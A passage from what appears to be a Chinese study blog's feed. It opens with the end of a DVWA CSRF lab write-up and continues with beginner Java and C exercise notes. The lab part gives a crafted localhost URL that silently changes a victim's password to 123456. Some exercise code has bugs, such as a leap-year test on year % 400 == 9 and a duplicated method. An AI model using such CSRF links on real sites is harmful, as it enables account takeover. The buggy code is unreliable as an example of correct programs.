invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这里可以通过构造链接的方法：<br><a href="http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#">http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a><br>当受害者点击了这个链接，他的密码就会被改成123456<br><img src="https://s2.loli.net/2023/07/23/T9NcIxyGHjvKJrQ.png" alt="image.png"><br>但这种连接容易被人看出来，也可以通过写一个简单的html页面来攻击<br>因为前面改了123456所以这里用password<br>这时用123456来登陆就不行了<br><img src="https://s2.loli.net/2023/07/23/GRE7Hk1uzSTVPYo.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java随笔</title>
      <link href="/2023/05/29/java%E9%9A%8F%E7%AC%94/"/>
      <url>/2023/05/29/java%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<h1 id="和1与，看是否为0，判断32次"><a href="#和1与，看是否为0，判断32次" class="headerlink" title="和1与，看是否为0，判断32次"></a>和1与，看是否为0，判断32次</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (a &amp; <span class="number">1</span> == <span class="number">1</span>)</span><br><span class="line">count++;</span><br><span class="line">a = a &gt;&gt; <span class="number">1</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, count);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">      <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((a &amp; <span class="number">1</span>) == <span class="number">1</span>)</span><br><span class="line">               count++;</span><br><span class="line">       a &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       sc.close();</span><br><span class="line">       System.out.println(<span class="string">&quot;1的个数为 &quot;</span> + count);</span><br><span class="line">       </span><br><span class="line">       <span class="comment">//另一种写法</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">15</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">cc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> ((n &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">               cc++;</span><br><span class="line">           &#125;</span><br><span class="line">           n &gt;&gt;&gt;= <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h2 id="妙妙方法"><a href="#妙妙方法" class="headerlink" title="妙妙方法"></a>妙妙方法</h2><p>一个数字与上这个数字减一的数，该数二进制最右边的1必然会消除掉，以此类推，从右往左，每一次进行按位与操作，都会取消掉一个1，直到该数字变为0，跳出循环，就得到了该数字二进制中1的个数。<br>以21(0001 0011)为例：</p><p>0001 0011</p><p>0001 0010</p><p>0001 0010 第一次与的结果 </p><p>0001 0001 </p><p>0001 0000 第二次与的结果</p><p>0000 1111</p><p>0000 0000 第三次与的结果，跳出循环，count &#x3D; 3;</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (a != <span class="number">0</span>) &#123;</span><br><span class="line">a = a &amp; (a - <span class="number">1</span>);</span><br><span class="line">count++; </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, count);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">15</span>;</span><br><span class="line">   <span class="type">int</span> <span class="variable">ccc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">       n = n &amp; (n - <span class="number">1</span>);</span><br><span class="line">       ccc++;</span><br><span class="line">   &#125;</span><br><span class="line">   System.out.println(ccc);</span><br></pre></td></tr></table></figure><h1 id="水仙花数"><a href="#水仙花数" class="headerlink" title="水仙花数"></a>水仙花数</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">   <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">   <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">100</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">       a = i % <span class="number">10</span>;</span><br><span class="line">       b = i / <span class="number">10</span> % <span class="number">10</span>;</span><br><span class="line">       c = i / <span class="number">100</span>;</span><br><span class="line">       <span class="keyword">if</span> (Math.pow(a, <span class="number">3</span>) + Math.pow(b, <span class="number">3</span>) + Math.pow(c, <span class="number">3</span>) == i)</span><br><span class="line">           System.out.println(i);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">100</span>; i &lt; <span class="number">999</span>; i++) &#123;</span><br><span class="line">           <span class="type">int</span> <span class="variable">tem1</span> <span class="operator">=</span> i;</span><br><span class="line">           <span class="keyword">while</span>(tem1 != <span class="number">0</span>) &#123;</span><br><span class="line">               tmp += Math.pow(tem1 % <span class="number">10</span>, <span class="number">3</span>);</span><br><span class="line">               tem1 /= <span class="number">10</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (tmp == i)</span><br><span class="line">               System.out.println(tmp);</span><br><span class="line">           tmp = <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h2 id="拓展：一个整数的各个位数的位数次方"><a href="#拓展：一个整数的各个位数的位数次方" class="headerlink" title="拓展：一个整数的各个位数的位数次方"></a>拓展：一个整数的各个位数的位数次方</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; <span class="number">999999</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//记录位数</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> i; <span class="comment">//保存i值，以免影响for循环</span></span><br><span class="line">            <span class="keyword">while</span> (tmp != <span class="number">0</span>) &#123;</span><br><span class="line">                tmp /= <span class="number">10</span>;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp = i;<span class="comment">//再次用来求各个位数</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//保存各个位数的位数次方</span></span><br><span class="line">            <span class="keyword">while</span>( tmp != <span class="number">0</span> ) &#123;</span><br><span class="line">                sum += Math.pow(tmp % <span class="number">10</span>, count);</span><br><span class="line">                tmp /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (sum == i)</span><br><span class="line">                System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="5-30学习笔记"><a href="#5-30学习笔记" class="headerlink" title="5_30学习笔记"></a>5_30学习笔记</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created with IntelliJ IDEA</span></span><br><span class="line"><span class="comment"> * Description</span></span><br><span class="line"><span class="comment"> * User: yxz</span></span><br><span class="line"><span class="comment"> * Data: 2023-05-30</span></span><br><span class="line"><span class="comment"> * Time: 14:12</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test530</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main8</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 求最大公约数 */</span></span><br><span class="line">         <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">         <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">         <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">rand</span> <span class="operator">=</span> a % b;</span><br><span class="line">         <span class="keyword">while</span>(rand != <span class="number">0</span>) &#123;</span><br><span class="line">             a = b;</span><br><span class="line">             b = rand;</span><br><span class="line">             rand = a % b;</span><br><span class="line">         &#125;</span><br><span class="line">        System.out.println(b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main7</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 判断素数方法2 */</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (;i &lt; Math.sqrt(n); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n % i == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;不是素数&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt; Math.sqrt(n)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;是素数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main6</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 判断素数 */</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">7</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (; i &lt;= n / <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n % i == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;不是素数&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt; n / <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;是素数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main5</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 输出整数的2进制 偶数位序列 奇数位序列 */</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">31</span>; i &gt;= <span class="number">1</span>; i -= <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.print(((a &gt;&gt; i) &amp; <span class="number">1</span>) + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;<span class="comment">//偶数位</span></span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">30</span>; i &gt;=<span class="number">1</span>; i -= <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.print(((a &gt;&gt; i) &amp; <span class="number">1</span>) + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;<span class="comment">//奇数位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main4</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*  输入密码 */</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">while</span> (count != <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请输入你的密码,共有&quot;</span> + count + <span class="string">&quot;次机会!&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> sc.nextLine();</span><br><span class="line">            <span class="keyword">if</span> (pass.equals(<span class="string">&quot;123&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;登陆成功&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;密码错误&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main3</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 输出整数的每一位 */</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">while</span> (sc.hasNextInt()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">            <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.print( n % <span class="number">10</span>);</span><br><span class="line">                n /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 乘法口诀表 */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                System.out.print(i + <span class="string">&quot;*&quot;</span> + j + <span class="string">&quot;=&quot;</span> + i * j + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* X形图案 */</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">while</span> (sc.hasNextInt()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((i == j) || (i + j == n - <span class="number">1</span>)) &#123;</span><br><span class="line">                        System.out.print(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created with IntelliJ IDEA</span></span><br><span class="line"><span class="comment"> * Description</span></span><br><span class="line"><span class="comment"> * User: yxz</span></span><br><span class="line"><span class="comment"> * Data: 2023-05-30</span></span><br><span class="line"><span class="comment"> * Time: 16:11</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fangfa1</span> &#123;</span><br><span class="line">    <span class="comment">//闰年</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isiLeapYear</span><span class="params">(<span class="type">int</span> year)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((year % <span class="number">4</span> == <span class="number">0</span>) &amp;&amp; (year % <span class="number">100</span> != <span class="number">0</span>) || (year % <span class="number">400</span> == <span class="number">9</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//方法定义</span></span><br><span class="line">    <span class="comment">//修饰符 返回值类型 方法名称([参数类型 形参])&#123;</span></span><br><span class="line">    <span class="comment">// 方法代码块</span></span><br><span class="line">    <span class="comment">//[return 返回值];</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        System.out.println(a + b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">year</span> <span class="operator">=</span> <span class="number">2021</span>;</span><br><span class="line">        <span class="comment">//System.out.println(isiLeapYear(year));</span></span><br><span class="line">        <span class="comment">//int ret = add(x, y);//实际参数 ret：接收方法得返回值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="方法的重载与重写的区别"><a href="#方法的重载与重写的区别" class="headerlink" title="方法的重载与重写的区别"></a>方法的重载与重写的区别</h1><p>方法重写是存在子父类之间的,子类定义的方法与父类中的方法具有相同的方法名字,相同的参数表和相同的返回类型 </p><p>方法重载是指同一个类中的多个方法具有相同的名字,但这些方法具有不同的参数列表,即参数的数量或参数类型不能完全相同</p><ol><li>方法的名称必须一样</li><li>方法的参数不一样 [数据类型， 个数， 顺序]</li><li>返回值没有要求</li><li>签名使得同名的方法可以区别</li></ol><h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created with IntelliJ IDEA</span></span><br><span class="line"><span class="comment"> * Description</span></span><br><span class="line"><span class="comment"> * User: yxz</span></span><br><span class="line"><span class="comment"> * Data: 2023-05-30</span></span><br><span class="line"><span class="comment"> * Time: 20:20</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">digui</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 汉诺塔</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos1 起始位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos2 中转位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos3 目标位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> n</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hanio</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> pos1, <span class="type">char</span> pos2, <span class="type">char</span> pos3)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            move(pos1, pos3);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hanio(n - <span class="number">1</span>, pos1, pos3, pos2);</span><br><span class="line">        move(pos1, pos3);</span><br><span class="line">        hanio(n - <span class="number">1</span>, pos2, pos1, pos3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos1 起始位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos2 目标位置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">move</span><span class="params">(<span class="type">char</span> pos1, <span class="type">char</span> pos2)</span> &#123;</span><br><span class="line">        System.out.print(pos1 + <span class="string">&quot; -&gt; &quot;</span> + pos2 + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//求1 +...+n;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fun2</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n + fun2(n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        hanio(<span class="number">1</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        hanio(<span class="number">2</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        hanio(<span class="number">3</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//求1 +...+n;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fun2</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n + fun2(n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//求数字的各位数之和</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> n % <span class="number">10</span> + sum(n / <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//按顺序打印数字的每一位,</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (num &gt; <span class="number">9</span>) &#123;</span><br><span class="line">            print(num / <span class="number">10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(num % <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//阶乘</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fac</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> n * fac(n - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main3</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(fac(<span class="number">5</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">function</span><span class="params">(<span class="type">int</span> a)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> 